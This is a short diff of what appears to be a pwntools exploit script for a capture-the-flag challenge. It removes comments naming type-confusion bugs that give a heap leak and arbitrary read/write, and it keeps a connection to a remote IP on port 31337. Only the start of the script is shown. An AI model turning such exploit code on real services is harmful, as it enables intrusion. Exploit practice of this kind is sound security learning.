@@ -1,9 +1,4 @@
 from pwn import *
-'''
-  BigNumber Calculate Vulnerability - Type Confusion / Heap Leak
-  Concat Function Vulnerability - Type Confusion / Arbitrary R/W
-'''
-
 s = remote('52.78.10.103',31337)
 raw_input()
 def Array(types,size):
